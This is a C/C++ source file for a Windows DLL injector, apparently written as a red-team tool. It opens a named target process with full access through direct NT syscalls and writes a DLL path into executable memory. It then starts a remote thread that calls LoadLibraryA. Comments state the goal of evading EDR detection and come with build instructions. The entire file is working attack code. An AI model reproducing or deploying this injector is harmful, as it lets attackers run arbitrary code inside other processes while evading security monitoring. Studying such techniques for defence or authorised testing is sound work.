#include "inj.h"
#include "kernel_abstract.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <iostream>
#include <memory>
#include <random>
#include <cwchar>

#ifdef __cplusplus
extern "C" {
#endif

/**
 * to build, 64 bit only right now (only guaranteed on Win11-23h2):
 * 
 * g++ -c -o inj.o inj.cpp -DUNICODE
 * ar rcs libinj.a inj.o
 * g++ inj.o -o inj.exe // for building just the c injector without go
 * or just use the build bat script :-)
 * 
 * Inspired by research I have conducted form the below sources:
 * My own CGO DLL injector (this was supposed to be modifications but has turned into a rewrite & deeper learning)
 * https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
 * https://signal-labs.com/analysis-of-edr-hooks-bypasses-amp-our-rust-sample/
 * https://github.com/lsecqt / https://www.youtube.com/@Lsecqt 
 * https://alice.climent-pommeret.red/
 * https://github.com/cr-0w
*/

#define MAX_DLL_PATH 255
#define ERROR_LOGGING_ENABLED 1

int main(int argc, char *argv[]) {
    int res = openProcAndExec(argv[1], argv[2]); // [1] is dll path, [2] e.g. notepad.exe
}


void logError(const char* message) {
    if (ERROR_LOGGING_ENABLED) {
        std::cerr << "Error: " << message << std::endl;
    }
}


/**
 * @brief Retrieves a handle to a process by its name.
 *
 * This function scans all processes currently running in the system to find a process
 * that matches the specified name. It creates a snapshot of all processes, iterates through
 * this list, and compares each process's name with the provided process name. When a match is found,
 * it uses a direct syscall to `NtOpenProcess` to open the process with all possible access rights and
 * returns a handle to the identified process.
 *
 * This approach bypasses the standard Windows API, evading EDR detection and monitoring which target 
 * higher-level API functions.
 *
 * @param processName A string representing the name of the process to find.
 * @return HANDLE Returns a handle to the process if found, NULL otherwise.
 */
HANDLE getHandleToProcessByName(const char* processName) {
    PROCESSENTRY32 entry; // stores process entry information
    entry.dwSize = sizeof(PROCESSENTRY32); // size of the structure
    char buf[MAX_PATH] = {}; // buffer to store the name of the executable
    size_t charsConverted = 0;
    HANDLE snapshot = NULL;
    
    // for direct calls via ntdll.dll 
    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };
    NTSTATUS status = 0x0;
    HANDLE hProcess = NULL;

    // snapshot of all processes in the system
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        logError("Failed to create process snapshot");
        return 0; // return 0 if snapshot creation fails
    }

    // iterate over all processes in the snapshot
    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            // convert process name from wide char to multibyte string
            wcstombs_s(&charsConverted, buf, entry.szExeFile, MAX_PATH);

            // check if current process name matches the target process name
            if (_stricmp(buf, processName) == 0) {
                // open the process with all possible access rights (n.b. not calling via ntdll as we dont yet have the pid)
                ULONG_PTR processIdPtr = static_cast<ULONG_PTR>(entry.th32ProcessID);
                CLIENT_ID clientId = { reinterpret_cast<HANDLE>(processIdPtr), nullptr };
                status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &clientId); // direct call

                if (status == 0x0) {
                    NtClose(snapshot); // close the snapshot handle as it is no longer needed
                    return hProcess; // return the process ID TODO just return the handle?
                }
            }
        }
    }

    NtClose(snapshot); // close the snapshot handle if process not found
    logError("Target process not found");
    return NULL; // return 0 if process not found
}


/**
 * @brief Opens a specified process and executes a DLL injection.
 *
 * This function performs DLL injection into a specified process. It first retrieves
 * the process ID of the target process, then allocates memory within that process to
 * store the DLL path. After writing the DLL path into the allocated memory, it creates
 * a remote thread in the target process to execute `LoadLibraryA`, loading the
 * specified DLL into the process's address space.
 *
 * @param pathToDLL A string containing the path to the DLL to be injected.
 * @param processToInj A string specifying the name of the process to inject the DLL into.
 * @return int Returns 0 on successful injection, -1 on failure.
 */
int openProcAndExec(const char *pathToDLL, const char *processToInj) {

    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };
    NTSTATUS status = 0x0;

    // validate input params 
    if (pathToDLL == NULL || processToInj == NULL) {
        logError("Invalid usage: inj.exe 'path_to_all.dll' 'process_to_inject_into.exe'. Quitting...");
        return -1; // return error if input params are null
    }

    char dllPathToInject[MAX_DLL_PATH];
    if (strlen(pathToDLL) >= sizeof(dllPathToInject)) {
        logError("DLL path length exceeds buffer size");
        return -1;
    }
    
    // safely copy path to DLL into a local buffer
    strncpy(dllPathToInject, pathToDLL, sizeof(dllPathToInject));
    dllPathToInject[sizeof(dllPathToInject) - 1] = '\0'; // ensure null termination
    size_t dllPathLength = strlen(dllPathToInject) + 1; // length including null terminator

    // get a handle to the process we wish to inject into 
    HANDLE hProcess = getHandleToProcessByName(processToInj);
    if (hProcess == NULL) {
        return -1;
    }

    // get handle to ntdll
    HMODULE hNTDLL = getModule(L"ntdll.dll");
    if (!hNTDLL) {
        logError("Failed to get handle to ntdll.dll");
        return -1;
    }

    // get handle to the Kernel32.dll and the address of LoadLibraryA
    HMODULE hK32 = getModule(L"Kernel32");
    if (!hK32) {
        logError("Failed to get handle to Kernel32.dll");
        return -1;
    }
    
    // get modules
    PTHREAD_START_ROUTINE loadlib = (PTHREAD_START_ROUTINE)GetProcAddress(hK32, "LoadLibraryA");

    // allocate memory in the target process for the DLL path
    LPVOID alloc = VirtualAllocEx(hProcess, NULL, dllPathLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (alloc == NULL) {
        NtClose(hProcess);
        logError("Failed to allocate memory in target process");
        return -1; // return error if memory allocation fails
    }

    // write the DLL path to the allocated memory in the target process
    if (!WriteProcessMemory(hProcess, alloc, dllPathToInject, dllPathLength, nullptr)) {
        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
        NtClose(hProcess);
        logError("Failed to write DLL path to process memory");
        return -1; // return error if writing to process memory fails
    }

    /**
     * Create a remote thread in the target process to load the DLL.
     * The function pointer LoadLibraryA is used as the starting address for the remote thread, and the allocated
     * memory (containing the DLL path) is passed as an argument to LoadLibraryA. This effectively loads the DLL into the target process.
    */
    // NTSTATUS remoteThread = localCreateRemoteThread(&hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibA_addr, alloc, 0, NULL);
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PVOID)loadlib, alloc, FALSE, 0, 0, 0, 0);

    if (status != 0x0) {
        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
        NtClose(hProcess);

        char errorMessage[256];
        sprintf(errorMessage, "Failed to create remote thread, error: 0x%lx", status);
        logError(errorMessage);

        return -1; // return error if thread creation fails
    }

    // wait for the remote thread to complete
    WaitForSingleObject(hThread, INFINITE);

    // clean up - close handles and free memory
    NtClose(hThread);
    VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
    NtClose(hProcess);

    return 0;
}


/**
 * @brief Finds system module for given module name
 * 
 * @param moduleName A string representing the name of the module. Made some improvements to
 * cr0w's function with some additional error handling.
 * Credit for the base func https://github.com/cr-0w
 * 
*/
HMODULE getModule(LPCWSTR moduleName) {
    if (moduleName == nullptr) {
        logError("Null module name provided to getModule");
        return nullptr;
    }

    HMODULE hModule = GetModuleHandle(moduleName);
    if (hModule == nullptr) {
        // get the system error message
        LPVOID lpMsgBuf;
        DWORD dw = GetLastError(); 

        FormatMessage(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | 
            FORMAT_MESSAGE_FROM_SYSTEM |
            FORMAT_MESSAGE_IGNORE_INSERTS,
            nullptr,
            dw,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPWSTR) &lpMsgBuf,
            0, nullptr );

        // convert to a narrow character string and print the error
        char moduleNameNarrow[256];
        wcstombs(moduleNameNarrow, moduleName, 256);

        char combinedMessage[512];
        snprintf(combinedMessage, 512, "Failed to load module %s: %s", moduleNameNarrow, (char*)lpMsgBuf);

        logError(combinedMessage);
        LocalFree(lpMsgBuf);

        return nullptr;
    }

    return hModule;
}

#ifdef __cplusplus
}
#endif